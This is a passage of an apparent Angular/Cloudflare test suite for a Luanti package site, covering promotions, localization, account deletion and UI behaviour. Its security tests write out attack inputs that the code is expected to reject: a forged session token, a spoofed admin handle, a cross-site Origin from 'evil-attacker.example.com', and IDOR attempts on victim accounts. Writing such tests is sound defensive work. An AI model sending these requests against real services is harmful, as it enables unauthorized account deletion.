    // - Promo B (priority 150): Server Spotlight (Hero Slide #2 only, show_in_hero: true, row_enabled: false)
    // - Promo C (priority 120): Row-only Curated Showcase (show_in_hero: false, row_enabled: true)
    pkgService.setPromotions([
      {
        id: 'promo_server_spotlight',
        title: 'Community Server Spotlight',
        short_desc: 'Explore multiplayer servers running Luanti 5.17+',
        banner_url: '/promo.png',
        cta_label: 'Browse Servers',
        cta_url: '/?tag=multiplayer',
        badge_text: 'SPOTLIGHT',
        starts_at: new Date(Date.now() - 60_000).toISOString(),
        expires_at: futureIso,
        priority: 150,
        show_in_hero: true,
        row_enabled: false
      },
      {
        id: 'promo_gamejam_2026',
        title: 'Luanti Game Jam 2026',
        short_desc: 'Play and rate brand-new voxel games submitted for the annual Luanti Game Jam 2026!',
        banner_url: '/promo.png',
        cta_label: 'Explore Submissions',
        cta_url: '/?tag=jam_game_2026',
        secondary_cta_label: 'Submit Package',
        secondary_cta_url: '/submit',
        badge_text: 'GAME JAM 2026',
        starts_at: new Date(Date.now() - 60_000).toISOString(),
        expires_at: futureIso,
        priority: 200,
        show_in_hero: true,
        row_enabled: true,
        row_title: 'i18n:carousel.promoGameJamTitle|year=2026',
        row_subtitle: 'i18n:carousel.promoGameJamSubtitle|year=2026',
        row_icon: 'trophy',
        row_filter_tags: ['jam_game_2026', 'gamejam'],
        row_pinned_packages: ['Wuzzy/mineclone2'],
        row_sort_by: 'newest',
        row_show_empty_cta: true,
        translations: {
          sk: {
            title: 'Luanti Game Jam 2026 — Súťaž',
            badge_text: 'SÚŤAŽ 2026'
          }
        }
      },
      {
        id: 'promo_row_only',
        title: 'Row-Only Tag Showcase',
        short_desc: '',
        banner_url: '',
        cta_label: 'View All',
        cta_url: '/?tag=survival',
        badge_text: 'FEATURED TAG',
        starts_at: new Date(Date.now() - 60_000).toISOString(),
        expires_at: futureIso,
        priority: 120,
        show_in_hero: false,
        row_enabled: true,
        row_title: 'i18n:carousel.promoTagShowcaseTitle|tag=Survival',
        row_subtitle: 'i18n:carousel.promoTagShowcaseSubtitle',
        row_icon: 'sparkles',
        row_filter_tags: ['survival'],
        row_sort_by: 'downloads'
      }
    ]);

    // Verify Hero Promotions only include `show_in_hero !== false` ordered by priority DESC (200 then 150)
    const heroPromos = pkgService.activeHeroPromotions();
    expect(heroPromos.map(p => p.id)).toEqual(['promo_gamejam_2026', 'promo_server_spotlight']);
    const heroShowcaseIds = pkgService.heroShowcasePackages().map(p => p.id);
    expect(heroShowcaseIds[0]).toBe('promo:promo_gamejam_2026');
    expect(heroShowcaseIds[1]).toBe('promo:promo_server_spotlight');
    expect(heroShowcaseIds.includes('promo:promo_row_only')).toBe(false);

    // Verify Promotional Package Rows include both `promo_gamejam_2026` (priority 200) and `promo_row_only` (priority 120)
    const promoRows = pkgService.activePromotionalRows();
    expect(promoRows.map(r => r.promotion.id)).toEqual(['promo_gamejam_2026', 'promo_row_only']);

    // Verify Game Jam 2026 row has pinned package first, followed by newest matching tagged submissions
    const jamRow = promoRows[0];
    expect(jamRow.title).toBe('Luanti Game Jam 2026 Submissions');
    expect(jamRow.packages.map(p => p.id)).toEqual([
      'Wuzzy/mineclone2',
      'jammer2/sky_islands_2026',
      'jammer/voxel_quest_2026'
    ]);

    // Verify Multi-Language Localization (Tier 1 i18n template + Tier 2 Slovak admin override)
    i18n.setLocale('sk');
    const jamRowSk = pkgService.activePromotionalRows()[0];
    expect(jamRowSk.title).toBe('Príspevky Luanti Game Jam 2026');
    expect(jamRowSk.badgeText).toBe('SÚŤAŽ 2026');
    expect(pkgService.heroShowcasePackages()[0].title).toBe('Luanti Game Jam 2026 — Súťaž');
    i18n.setLocale('en');

    // Verify ContentDB-agnostic Unified Tag Mirror & Promotional Row Delta Overlay on Catalog
    expect(DEFAULT_CONTENTDB_TAGS.some(t => t.name === 'jam_game_2026')).toBe(true);
    expect(DEFAULT_CONTENTDB_TAGS.some(t => t.name === 'gamejam')).toBe(true);
    expect(DEFAULT_CONTENTDB_TAGS.some(t => t.name === 'crafting')).toBe(true);

    // Verify DRY matching helper returns identical count to rendered row
    expect(pkgService.getMatchingPackagesForPromotionRow(jamRow.promotion).map(p => p.id)).toEqual(
      jamRow.packages.map(p => p.id)
    );

    // Verify ensurePromotionAndTagTables is a 0-query no-op unless force === true (Cloudflare D1 quota guard)
    const { ensurePromotionAndTagTables } = await import('../../functions/api/lib/upstream');
    let d1QueryCount = 0;
    const quotaGuardDb = {
      prepare() {
        d1QueryCount++;
        return {
          async run() { return {}; },
          async all() { return { results: [] }; }
        };
      }
    };
    await ensurePromotionAndTagTables(quotaGuardDb, false);
    expect(d1QueryCount).toBe(0);

    const baseCatalog = [
      {
        author: 'Wuzzy',
        name: 'mineclone2',
        title: 'VoxeLibre',
        type: 'game',
        short_desc: 'Survival sandbox game',
        tags: ['survival']
      }
    ];
    const syncedDelta = {
      tagMap: {
        'wuzzy/mineclone2': ['jam_game_2026'],
        'newauthor/brand_new_jam_entry': ['jam_game_2026']
      },
      items: [
        {
          author: 'newauthor',
          name: 'brand_new_jam_entry',
          title: 'Brand New Jam Entry',
          type: 'game',
          short_desc: 'Submitted 2 minutes ago on ContentDB!'
        }
      ]
    };
    const mergedCatalog = overlayPromotionRowDeltaOnCatalog(baseCatalog, syncedDelta);
    expect(mergedCatalog.length).toBe(2);
    const existingUpdated = mergedCatalog.find((p: any) => p.name === 'mineclone2');
    expect(existingUpdated?.tags).toContain('jam_game_2026');
    const newlyInjected = mergedCatalog.find((p: any) => p.name === 'brand_new_jam_entry');
    expect(newlyInjected?.tags).toContain('jam_game_2026');

    // Verify zero-allocation fast path when delta is already applied (HIT-EDGE optimization)
    const reOverlaid = overlayPromotionRowDeltaOnCatalog(mergedCatalog, syncedDelta);
    expect(reOverlaid).toBe(mergedCatalog);

    // Verify Admin & Promotion API access controls reject anonymous, non-admin, and suffix-spoofed actors
    const {
      onRequestGet: promoGet,
      onRequestPost: promoPost,
      onRequestDelete: promoDelete
    } = await import('../../functions/api/promotions/index');
    const { checkIsAdmin, createSessionToken } = await import('../../functions/api/auth/lib/session');

    // 1. Anonymous requests to GET/POST/DELETE /api/promotions must return 403 Forbidden
    const anonGetRes = await promoGet({
      request: new Request('https://luantihub.org/api/promotions?admin=1', { method: 'GET' }),
      env: { DB: quotaGuardDb, SESSION_SECRET: 'test-secret', ADMIN_USERS: 'sakel' }
    });
    expect(anonGetRes.status).toBe(403);

    const anonPostRes = await promoPost({
      request: new Request('https://luantihub.org/api/promotions', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ title: 'Malicious Promo', expires_at: futureIso })
      }),
      env: { DB: quotaGuardDb, SESSION_SECRET: 'test-secret', ADMIN_USERS: 'sakel' }
    });
    expect(anonPostRes.status).toBe(403);

    const anonDelRes = await promoDelete({
      request: new Request('https://luantihub.org/api/promotions?id=promo_gamejam_2026', { method: 'DELETE' }),
      env: { DB: quotaGuardDb, SESSION_SECRET: 'test-secret', ADMIN_USERS: 'sakel' }
    });
    expect(anonDelRes.status).toBe(403);

    // 2. Authenticated non-admin user must also receive 403 Forbidden on /api/promotions
    const nonAdminToken = await createSessionToken('usr_regular', 'test-secret', {
      username: 'regular_user',
      role: 'user',
      verified: true
    });
    const nonAdminDb = {
      prepare(sql: string) {
        return {
          bind() {
            return {
              async first() {
                if (sql.includes('FROM users')) {
                  return { id: 'usr_regular', username: 'regular_user', role: 'user' };
                }
                return null;
              },
              async all() {
                if (sql.includes('FROM user_identities')) {
                  return {
                    results: [{ provider: 'github', username: 'regular_user', verified: 1 }]
                  };
                }
                return { results: [] };
              },
              async run() { return {}; }
            };
          }
        };
      }
    };
    const nonAdminPostRes = await promoPost({
      request: new Request('https://luantihub.org/api/promotions', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Cookie: `lh_session=${nonAdminToken}`
        },
        body: JSON.stringify({ title: 'Unauthorized Promo', expires_at: futureIso })
      }),
      env: { DB: nonAdminDb, SESSION_SECRET: 'test-secret', ADMIN_USERS: 'sakel' }
    });
    expect(nonAdminPostRes.status).toBe(403);

    // 3. checkIsAdmin must reject unverified identities and reject suffix-spoofed handles (e.g. `sakel_gi` when ADMIN_USERS="sakel")
    expect(
      checkIsAdmin(
        { username: 'sakel', role: 'admin' },
        [{ provider: 'github', username: 'sakel', verified: false }],
        'sakel'
      )
    ).toBe(false);
    expect(
      checkIsAdmin(
        { username: 'sakel_gi', role: 'user' },
        [{ provider: 'gitlab', username: 'sakel_gi', verified: true }],
        'sakel'
      )
    ).toBe(false);
    expect(
      checkIsAdmin(
        { username: 'sakel', role: 'admin' },
        [{ provider: 'github', username: 'sakel', verified: true }],
        'sakel'
      )
    ).toBe(true);

    // 4. Verify centralized ThemeIconComponent & PROMO_ROW_ICON_OPTIONS (no emojis in labels & exact class binding on SVG)
    const { PROMO_ROW_ICON_OPTIONS, ThemeIconComponent } = await import('./shared/components/theme-icon.component');
    expect(PROMO_ROW_ICON_OPTIONS.map(o => o.value)).toEqual([
      'trophy',
      'gamepad',
      'sparkles',
      'flame',
      'star',
      'rocket'
    ]);
    for (const opt of PROMO_ROW_ICON_OPTIONS) {
      expect(opt.label).toMatch(/^[A-Za-z0-9 ]+$/);
    }
    const iconFixture = TestBed.createComponent(ThemeIconComponent);
    iconFixture.componentInstance.name = 'trophy';
    iconFixture.componentInstance.sizeClass = 'w-4 h-4';
    iconFixture.detectChanges();
    const renderedSvg = iconFixture.nativeElement.querySelector('svg') as SVGElement;
    expect(renderedSvg).toBeTruthy();
    expect(renderedSvg.getAttribute('class')).toContain('w-4');
    expect(renderedSvg.getAttribute('class')).toContain('h-4');
    expect(renderedSvg.getAttribute('class')).toContain('text-amber-400');

    pkgService.setPromotions([]);
  });

  it('should redirect /privacy and /delete-account to /legal, expose Google Play compliant deletion policy in /legal, and permanently erase user profile & D1 data via DELETE /api/auth/me?account=1', async () => {
    const pkgService = TestBed.inject(PackageService);
    const authService = TestBed.inject(AuthService);
    const settingsService = TestBed.inject(SettingsService);

    // 1. Verify Angular routes include /privacy and /delete-account redirecting to /legal
    const privacyRoute = routes.find(r => r.path === 'privacy');
    const deleteAccountRoute = routes.find(r => r.path === 'delete-account');
    expect(privacyRoute).toBeTruthy();
    expect(privacyRoute?.redirectTo).toBe('legal');
    expect(deleteAccountRoute).toBeTruthy();
    expect(deleteAccountRoute?.redirectTo).toBe('legal');

    // 2. Verify Cloudflare Pages Edge _middleware.ts returns 301 redirect for /privacy and /delete-account -> /legal
    const privacyEdgeRes = await edgeMiddleware({
      request: new Request('https://luantihub.org/privacy?lang=en'),
      next: async () => new Response('<html></html>', { status: 200 }),
      env: {}
    });
    expect(privacyEdgeRes.status).toBe(301);
    expect(privacyEdgeRes.headers.get('location')).toBe('https://luantihub.org/legal?lang=en');

    const deleteEdgeRes = await edgeMiddleware({
      request: new Request('https://luantihub.org/delete-account'),
      next: async () => new Response('<html></html>', { status: 200 }),
      env: {}
    });
    expect(deleteEdgeRes.status).toBe(301);
    expect(deleteEdgeRes.headers.get('location')).toBe('https://luantihub.org/legal');

    // 3. Verify /legal modal renders Section 4 (Account & Data Deletion) and triggers openAccountDeletionFlow()
    const appFixture = TestBed.createComponent(App);
    pkgService.openLegalModal(false);
    appFixture.detectChanges();

    const legalDeleteSection = appFixture.nativeElement.querySelector('[data-testid="legal-account-deletion-section"]') as HTMLElement;
    expect(legalDeleteSection).toBeTruthy();
    expect(legalDeleteSection.textContent).toContain('5. Account & Data Deletion');
    expect(legalDeleteSection.textContent).toContain('LuantiHub');
    expect(legalDeleteSection.textContent).toContain('from our databases');

    const legalDeleteBtn = appFixture.nativeElement.querySelector('[data-testid="legal-delete-account-btn"]') as HTMLButtonElement;
    expect(legalDeleteBtn).toBeTruthy();

    // 3b. When unauthenticated, clicking "Manage / Delete My Account & Data" opens the Auth Modal and persists lh_oauth_account_delete; closing Auth Modal cancels it cleanly
    (authService as any)._currentUser.set(null);
    authService.openAccountDeletionFlow();
    expect(authService.isAuthModalOpen()).toBe(true);
    expect(authService.requestAccountDeleteConfirm()).toBe(true);
    expect(sessionStorage.getItem('lh_oauth_account_delete')).toBe('1');
    authService.closeAuthModal();
    expect(authService.isAuthModalOpen()).toBe(false);
    expect(authService.requestAccountDeleteConfirm()).toBe(false);
    expect(sessionStorage.getItem('lh_oauth_account_delete')).toBeNull();

    // When signed in, clicking the button in /legal closes Legal modal and opens Profile Drawer on the Account tab with delete confirmation open
    (authService as any)._currentUser.set({
      id: 'usr_delete_test',
      username: 'del_tester',
      display_name: 'Delete Tester',
      avatar_url: 'logo.svg',
      bio: 'Testing deletion',
      identities: [{ provider: 'github', username: 'del_tester', profile_url: 'https://github.com/del_tester', verified: true }],
      packages: [{ id: 'del_tester/my_git_mod', name: 'my_git_mod', title: 'My Git Mod', type: 'mod', provider: 'github', source: 'git' }]
    });
    settingsService.favorites.set(['del_tester/my_git_mod']);
    appFixture.detectChanges();

    legalDeleteBtn.click();
    appFixture.detectChanges();
    await appFixture.whenStable();
    appFixture.detectChanges();
    expect(pkgService.isLegalModalOpen()).toBe(false);
    expect(authService.isProfileDrawerOpen()).toBe(true);

    // 4. Verify ProfileDrawerComponent rendered inside App has Account tab active and Danger Zone confirmation UI expanded
    const deleteSectionEl = appFixture.nativeElement.querySelector('[data-testid="delete-account-section"]') as HTMLElement;
    expect(deleteSectionEl).toBeTruthy();
    const confirmBoxEl = appFixture.nativeElement.querySelector('[data-testid="delete-account-confirm-box"]') as HTMLElement;
    expect(confirmBoxEl).toBeTruthy();
    const includePkgCheckbox = appFixture.nativeElement.querySelector('[data-testid="delete-account-include-packages-checkbox"]') as HTMLInputElement;
    expect(includePkgCheckbox).toBeTruthy();

    // 5. Verify Backend DELETE /api/auth/me?account=1&deletePackages=1 erases all D1 tables and prevents session resurrection
    const { onRequestDelete: authMeDelete, onRequestGet: authMeGet } = await import('../../functions/api/auth/me');
    const executedSql: { sql: string; args: any[] }[] = [];
    let userDeletedInDb = false;

    const mockDeleteDb = {
      prepare(sql: string) {
        return {
          bind(...args: any[]) {
            return {
              async first() {
                if (sql.includes('FROM users WHERE id = ?')) {
                  if (userDeletedInDb) return null;
                  return { id: 'usr_delete_test', username: 'del_tester', display_name: 'Delete Tester', role: 'user' };
                }
                return null;
              },
              async all() {
                if (sql.includes('FROM packages WHERE')) {
                  return {
                    results: [
                      { id: 'del_tester/my_git_mod', provider: 'github', author_id: 'usr_delete_test' },
                      { id: 'del_tester/cdb_mod', provider: 'contentdb', author_id: 'usr_delete_test' },
                      { id: 'other_author/hijack_mod', provider: 'github', author_id: 'usr_other_owner' }
                    ]
                  };
                }
                return { results: [] };
              },
              async run() {
                executedSql.push({ sql, args });
                if (sql.includes('DELETE FROM users WHERE id = ?')) {
                  userDeletedInDb = true;
                }
                return { success: true };
              }
            };
          }
        };
      }
    };

    const sessionToken = await createSessionToken('usr_delete_test', 'test-delete-secret', {
      username: 'del_tester',
      displayName: 'Delete Tester',
      provider: 'github',
      verified: true
    });

    // 5a. Security checks: reject unauthenticated, forged token, missing confirmation header, cross-site CSRF, and IDOR userId/username
    const unauthDelRes = await authMeDelete({
      request: new Request('https://luantihub.org/api/auth/me?account=1', {
        method: 'DELETE',
        headers: { 'X-Confirm-Account-Delete': 'permanent' }
      }),
      env: { DB: mockDeleteDb, SESSION_SECRET: 'test-delete-secret' }
    });
    expect(unauthDelRes.status).toBe(401);

    const forgedTokenDelRes = await authMeDelete({
      request: new Request('https://luantihub.org/api/auth/me?account=1', {
        method: 'DELETE',
        headers: {
          Cookie: 'lh_session=forged.token',
          'X-Confirm-Account-Delete': 'permanent'
        }
      }),
      env: { DB: mockDeleteDb, SESSION_SECRET: 'test-delete-secret' }
    });
    expect(forgedTokenDelRes.status).toBe(401);

    const missingHeaderDelRes = await authMeDelete({
      request: new Request('https://luantihub.org/api/auth/me?account=1', {
        method: 'DELETE',
        headers: { Cookie: `lh_session=${sessionToken}` }
      }),
      env: { DB: mockDeleteDb, SESSION_SECRET: 'test-delete-secret' }
    });
    expect(missingHeaderDelRes.status).toBe(403);

    const csrfOriginDelRes = await authMeDelete({
      request: new Request('https://luantihub.org/api/auth/me?account=1', {
        method: 'DELETE',
        headers: {
          Cookie: `lh_session=${sessionToken}`,
          Origin: 'https://evil-attacker.example.com',
          'X-Confirm-Account-Delete': 'permanent'
        }
      }),
      env: { DB: mockDeleteDb, SESSION_SECRET: 'test-delete-secret' }
    });
    expect(csrfOriginDelRes.status).toBe(403);

    const idorUserDelRes = await authMeDelete({
      request: new Request('https://luantihub.org/api/auth/me?account=1&userId=usr_victim', {
        method: 'DELETE',
        headers: {
          Cookie: `lh_session=${sessionToken}`,
          'X-Confirm-Account-Delete': 'permanent'
        }
      }),
      env: { DB: mockDeleteDb, SESSION_SECRET: 'test-delete-secret' }
    });
    expect(idorUserDelRes.status).toBe(403);

    const idorUsernameDelRes = await authMeDelete({
      request: new Request('https://luantihub.org/api/auth/me?account=1&username=victim_handle', {
        method: 'DELETE',
        headers: {
          Cookie: `lh_session=${sessionToken}`,
          'X-Confirm-Account-Delete': 'permanent'
        }
      }),
      env: { DB: mockDeleteDb, SESSION_SECRET: 'test-delete-secret' }
    });
    expect(idorUsernameDelRes.status).toBe(403);
    expect(executedSql.length).toBe(0);

    // 5b. Legitimate self-service deletion with valid session + X-Confirm-Account-Delete: permanent
    const delRes = await authMeDelete({
      request: new Request('https://luantihub.org/api/auth/me?account=1&deletePackages=1', {
        method: 'DELETE',
        headers: {
          Cookie: `lh_session=${sessionToken}`,
          Origin: 'https://luantihub.org',
          'X-Confirm-Account-Delete': 'permanent'
        }
      }),
      env: { DB: mockDeleteDb, SESSION_SECRET: 'test-delete-secret' }
    });
    expect(delRes.status).toBe(200);
    const delJson = await delRes.json();
    expect(delJson.success).toBe(true);
    expect(delJson.accountDeleted).toBe(true);
    expect(delJson.deletedUserId).toBe('usr_delete_test');
    expect(delJson.deletedPackages).toBe(true);
    expect(delJson.deletedSubmittedPackagesCount).toBe(1);
    expect(delRes.headers.get('set-cookie')).toContain('Max-Age=0');

    // Verify another user's package (other_author/hijack_mod) and ContentDB package (del_tester/cdb_mod) were NEVER deleted
    const deletedPkgArgs = executedSql
      .filter(e => e.sql.includes('DELETE FROM packages WHERE id = ?'))
      .map(e => e.args[0]);
    expect(deletedPkgArgs).toEqual(['del_tester/my_git_mod']);

    // Replay of DELETE with the same token in the same isolate is immediately rejected (401)
    const replayDelRes = await authMeDelete({
      request: new Request('https://luantihub.org/api/auth/me?account=1', {
        method: 'DELETE',
        headers: {
          Cookie: `lh_session=${sessionToken}`,
          'X-Confirm-Account-Delete': 'permanent'
        }
      }),
      env: { DB: mockDeleteDb, SESSION_SECRET: 'test-delete-secret' }
    });
    expect(replayDelRes.status).toBe(401);

    // Verify all personal tables were cleaned up and pure-Git package was deleted while ContentDB package was unlinked
    const sqlStrings = executedSql.map(e => e.sql);
    expect(sqlStrings.some(s => s.includes('DELETE FROM packages WHERE id = ?'))).toBe(true);
    expect(sqlStrings.some(s => s.includes('UPDATE packages SET author_id = NULL WHERE author_id = ?'))).toBe(true);
    expect(sqlStrings.some(s => s.includes('DELETE FROM reviews WHERE user_id = ?'))).toBe(true);
    expect(sqlStrings.some(s => s.includes('DELETE FROM user_favorites'))).toBe(true);
    expect(sqlStrings.some(s => s.includes('DELETE FROM user_downloads WHERE user_id = ?'))).toBe(true);
    expect(sqlStrings.some(s => s.includes('DELETE FROM user_views WHERE user_id = ?'))).toBe(true);
    expect(sqlStrings.some(s => s.includes('UPDATE moderation_reports SET reporter_user_id = NULL'))).toBe(true);
    expect(sqlStrings.some(s => s.includes('DELETE FROM user_identities WHERE user_id = ?'))).toBe(true);
    expect(sqlStrings.some(s => s.includes('DELETE FROM users WHERE id = ?'))).toBe(true);

    // Subsequent GET /api/auth/me with the old cookie must NOT resurrect the deleted user from cookie claims
    const afterGetRes = await authMeGet({
      request: new Request('https://luantihub.org/api/auth/me', {
        headers: { Cookie: `lh_session=${sessionToken}` }
      }),
      env: { DB: mockDeleteDb, SESSION_SECRET: 'test-delete-secret' }
    });
    const afterGetJson = await afterGetRes.json();
    expect(afterGetJson.user).toBeNull();

    // 6. Verify confirming deletion in ProfileDrawerComponent calls AuthService.deleteAccount(), clears client state & favorites, and closes drawer
    const origFetch = globalThis.fetch;
    globalThis.fetch = (async () =>
      new Response(JSON.stringify({ success: true, accountDeleted: true }), {
        status: 200,
        headers: { 'Content-Type': 'application/json' }
      })) as any;
    try {
      const confirmDeleteBtn = appFixture.nativeElement.querySelector('[data-testid="confirm-delete-account-btn"]') as HTMLButtonElement;
      expect(confirmDeleteBtn).toBeTruthy();
      confirmDeleteBtn.click();
      await new Promise(resolve => setTimeout(resolve, 10));
      expect(authService.currentUser()).toBeNull();
      expect(settingsService.favorites()).toEqual([]);
      expect(authService.isProfileDrawerOpen()).toBe(false);
    } finally {
      globalThis.fetch = origFetch;
    }
  });

  it('collapses Package Dependencies by default when total items > 20 and keeps it expanded when <= 20', async () => {
    const pkgService = TestBed.inject(PackageService);
    const appFixture = TestBed.createComponent(App);

    const smallDepsPkg: LuantiPackage = {
      id: 'wuzzy/small_deps',
      author: 'Wuzzy',
      name: 'small_deps',
      title: 'Small Deps Mod',
      type: 'mod',
      short_desc: 'Mod with 5 dependencies',
      thumbnail: 'logo.svg',
      banner: 'logo.svg',
      score: 4.8,
      downloads: 1200,
      license: 'MIT',
      media_license: 'MIT',
      source: 'official',
      sources: ['official'],
      tags: ['mod'],
      min_minetest_version: '5.0.0',
      featured: false,
      dependencies: ['default', 'farming', 'doors'],
      optional_dependencies: ['mesecons', 'pipeworks']
    };

    (pkgService as any)._activePackage.set(smallDepsPkg);
    appFixture.detectChanges();
    await appFixture.whenStable();
    appFixture.detectChanges();

    const depsSectionSmall = appFixture.nativeElement.querySelector('[data-testid="package-dependencies-section"]') as HTMLElement;
    expect(depsSectionSmall).toBeTruthy();
    const toggleBtnSmall = appFixture.nativeElement.querySelector('[data-testid="toggle-dependencies-btn"]') as HTMLButtonElement;
    expect(toggleBtnSmall).toBeTruthy();
    expect(toggleBtnSmall.getAttribute('aria-expanded')).toBe('true');
    expect(depsSectionSmall.textContent).toContain('default');

    // Now switch to a package with > 20 dependencies/provides (e.g. VoxeLibre)
    const manyProvides = Array.from({ length: 25 }, (_, i) => `vl_submod_${i + 1}`);
    const largeDepsPkg: LuantiPackage = {
      ...smallDepsPkg,
      id: 'wuzzy/mineclone2',
      name: 'mineclone2',
      title: 'VoxeLibre (formerly MineClone2)',
      type: 'game',
      dependencies: [],
      optional_dependencies: [],
      provides: manyProvides
    };

    (pkgService as any)._activePackage.set(largeDepsPkg);
    appFixture.detectChanges();

    const depsSectionLarge = appFixture.nativeElement.querySelector('[data-testid="package-dependencies-section"]') as HTMLElement;
    const toggleBtnLarge = appFixture.nativeElement.querySelector('[data-testid="toggle-dependencies-btn"]') as HTMLButtonElement;
    expect(toggleBtnLarge.getAttribute('aria-expanded')).toBe('false');
    expect(depsSectionLarge.textContent).not.toContain('vl_submod_1');

    // Clicking the header expands the section
    toggleBtnLarge.click();
    appFixture.detectChanges();
    expect(toggleBtnLarge.getAttribute('aria-expanded')).toBe('true');
    expect(depsSectionLarge.textContent).toContain('vl_submod_1');
  });

  it('excludes deprecated and abandoned packages from Hero Showcase, Top 10, and Home dashboard rows', () => {
    const pkgService = TestBed.inject(PackageService);

    const activeMod: LuantiPackage = {
      id: 'active/good_mod',
      author: 'active',
      name: 'good_mod',
      title: 'Good Active Mod',
      type: 'mod',
      short_desc: 'Actively maintained automation mod',
      thumbnail: 'logo.svg',
      banner: 'logo.svg',
      score: 4.9,
      downloads: 50000,
      daily_downloads: 200,
      weekly_downloads: 1200,
      license: 'MIT',
      media_license: 'MIT',
      source: 'git',
      sources: ['official', 'git'],
      tags: ['automation', 'technology'],
      min_minetest_version: '5.0.0',
      featured: true,
      dependencies: [],
      optional_dependencies: []
    };

    const deprecatedTxp: LuantiPackage = {
      id: 'old/ctf_plus',
      author: 'old',
      name: 'ctf_plus',
      title: 'CTF PluS! (ABANDONED)',
      type: 'txp',
      short_desc: 'This texture pack is not worked on anymore.',
      dev_state: 'DEPRECATED',
      thumbnail: 'logo.svg',
      banner: 'logo.svg',
      score: 5.0,
      downloads: 999999,
      daily_downloads: 9000,
      weekly_downloads: 50000,
      license: 'CC-BY-3.0',
      media_license: 'CC-BY-3.0',
      source: 'official',
      sources: ['official'],
      tags: ['txp'],
      min_minetest_version: '5.0.0',
      featured: true,
      dependencies: [],
      optional_dependencies: []
    };

    expect(pkgService.isPackageDeprecated(activeMod)).toBe(false);
    expect(pkgService.isPackageDeprecated(deprecatedTxp)).toBe(true);
    expect(pkgService.isPackageDeprecated({ title: 'Normal Title', dev_state: 'DEPRECATED' })).toBe(true);
    expect(pkgService.isPackageDeprecated({ title: 'Some Mod (ABANDONED)' })).toBe(true);

    (pkgService as any)._packages.set([activeMod, deprecatedTxp]);
    (pkgService as any)._serverTop10Today.set([deprecatedTxp, activeMod]);
    (pkgService as any)._serverTop10Week.set([deprecatedTxp, activeMod]);

    expect(pkgService.heroShowcasePackages().some(p => p.id === 'old/ctf_plus')).toBe(false);
    expect(pkgService.top10TodayPackages().some(p => p.id === 'old/ctf_plus')).toBe(false);
    expect(pkgService.top10WeekPackages().some(p => p.id === 'old/ctf_plus')).toBe(false);
    expect(pkgService.texturePacks().some(p => p.id === 'old/ctf_plus')).toBe(false);
    expect(pkgService.trendingPackages().some(p => p.id === 'active/good_mod')).toBe(true);
  });

  it('proxies git.minetest.land raw screenshot URLs through /api/packages?proxy_image= with ngsw-bypass=true and prunes failed gallery slides', () => {
    const pkgService = TestBed.inject(PackageService);
    const rawMeseHubShot = 'https://git.minetest.land/VoxeLibre/VoxeLibre/raw/branch/master/screenshot.png';
    const proxied = pkgService.toProxiedGitImageIfNeeded(rawMeseHubShot);
    expect(proxied).toBe(`/api/packages?proxy_image=${encodeURIComponent(rawMeseHubShot)}&ngsw-bypass=true`);
    expect(pkgService.isGitScreenshotUrl(proxied)).toBe(true);

    const cdbShot1 = 'https://content.luanti.org/uploads/shot1.png';
    const cdbShot2 = 'https://content.luanti.org/uploads/shot2.png';
    const merged = pkgService.mergePackageScreenshots(
      [rawMeseHubShot],
      [cdbShot1, cdbShot2]
    );
    expect(merged[0]).toBe(proxied);
    expect(merged[1]).toBe(cdbShot1);

    // Verify PackageDetailModalComponent prunes failed screenshot URLs and falls back to the first valid screenshot instead of logo.svg
    const modalFixture = TestBed.createComponent(PackageDetailModalComponent);
    const voxeLibrePkg = (pkgService as any).normalizePackage({
      id: 'wuzzy/mineclone2',
      author: 'Wuzzy',
      name: 'mineclone2',
      title: 'VoxeLibre (formerly MineClone2)',
      type: 'game',
      source: 'git',
      sources: ['official', 'git'],
      provider: 'mesehub',
      repo: 'https://git.minetest.land/VoxeLibre/VoxeLibre',
      banner: proxied,
      thumbnail: cdbShot1,
      screenshots: merged
    });
    modalFixture.componentInstance.package = voxeLibrePkg;
    (pkgService as any)._activePackage.set(voxeLibrePkg);
    modalFixture.detectChanges();

    expect(modalFixture.componentInstance.bannerImage).toBe(proxied);
    expect(modalFixture.componentInstance.fallbackBannerThumbnail).toBe(cdbShot1);
    expect(modalFixture.componentInstance.activeScreenshots().length).toBe(3);

    // Simulate the primary Git screenshot failing to load
    modalFixture.componentInstance.onScreenshotError(proxied);
    modalFixture.detectChanges();

    expect(modalFixture.componentInstance.activeScreenshots()).toEqual([cdbShot1, cdbShot2]);
    expect(modalFixture.componentInstance.bannerImage).toBe(cdbShot1);
    expect(modalFixture.componentInstance.mediaSlides().map(s => s.url)).toEqual([cdbShot1, cdbShot2]);
  });

  it('keeps Delete Profile & Stored Data collapsed in a neutral section by default in Profile Drawer until expanded', async () => {
    const authService = TestBed.inject(AuthService);
    const appFixture = TestBed.createComponent(App);
    (authService as any)._currentUser.set({
      id: 'usr_neutral_test',
      username: 'neutral_tester',
      display_name: 'Neutral Tester',
      avatar_url: 'logo.svg',
      bio: '',
      identities: [{ provider: 'mesehub', username: 'neutral_tester', profile_url: 'https://git.minetest.land/neutral_tester', verified: true }],
      packages: []
    });
    authService.openProfileDrawer(false);
    appFixture.detectChanges();
    await appFixture.whenStable();
    appFixture.detectChanges();

    const accountTabBtn = Array.from(
      appFixture.nativeElement.querySelectorAll('button[role="tab"]') as NodeListOf<HTMLButtonElement>
    ).find(btn => btn.textContent?.includes('Account'));
    expect(accountTabBtn).toBeTruthy();
    accountTabBtn!.click();
    appFixture.detectChanges();

    const deleteSection = appFixture.nativeElement.querySelector('[data-testid="delete-account-section"]') as HTMLElement;
    expect(deleteSection).toBeTruthy();
    const toggleBtn = appFixture.nativeElement.querySelector('[data-testid="toggle-delete-account-section-btn"]') as HTMLButtonElement;
    expect(toggleBtn).toBeTruthy();
    expect(toggleBtn.getAttribute('aria-expanded')).toBe('false');
    // Red danger box is hidden while collapsed
    expect(appFixture.nativeElement.querySelector('[data-testid="delete-account-danger-box"]')).toBeNull();

    // Expanding reveals the red danger box with non-technical database wording
    toggleBtn.click();
    appFixture.detectChanges();
    expect(toggleBtn.getAttribute('aria-expanded')).toBe('true');
    const dangerBox = appFixture.nativeElement.querySelector('[data-testid="delete-account-danger-box"]') as HTMLElement;
    expect(dangerBox).toBeTruthy();
    expect(dangerBox.textContent).toContain('from our databases');
    expect(dangerBox.textContent).not.toContain('Cloudflare D1');
  });

  it('falls back to fallbackThumbnail (and proxies git.minetest.land) in ImgFallbackDirective before falling back to logo.svg', () => {
    const imgEl = document.createElement('img');
    imgEl.src = 'https://codeberg.org/broken/repo/raw/branch/main/screenshot.png';
